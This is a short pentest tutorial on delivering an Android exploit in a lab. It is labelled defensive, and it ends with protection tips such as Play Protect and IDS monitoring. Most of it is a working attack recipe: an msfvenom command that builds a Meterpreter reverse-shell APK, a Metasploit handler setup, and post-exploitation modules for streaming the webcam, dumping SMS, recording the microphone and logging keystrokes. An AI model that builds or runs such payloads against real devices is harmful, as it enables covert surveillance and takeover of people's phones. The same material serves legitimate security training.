🔧 Example Workflow (Defensive/Ethical)

Here’s how a pentester legally simulates Android exploit delivery in a lab:

Payload Generation (msfvenom)

msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -o exploit.apk


-p specifies payload.

LHOST is your IP.

LPORT is listening port.

Output is exploit.apk.

⚠️ In reality, you’d only test this on your own device in a lab.

Multi-Handler Setup (Metasploit)

msfconsole
use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
set LHOST 192.168.1.10
set LPORT 4444
run


The handler can catch multiple payloads if configured with:

set ExitOnSession false


Post-Exploitation Payloads
Once a session opens, you can load different modules:

webcam_stream

dump_sms

record_mic

keyscan_start

🔐 Defensive Countermeasures

Since exploits like this still exist in 2025, here’s how to protect Android devices:

✅ Always install apps from Google Play or verified sources.

✅ Enable Google Play Protect.

✅ Apply security patches monthly.

✅ Use mobile threat defense apps (e.g., Lookout, Zimperium).

✅ Restrict app permissions (camera, mic, storage).

✅ Monitor traffic for suspicious reverse shells (with IDS/IPS).
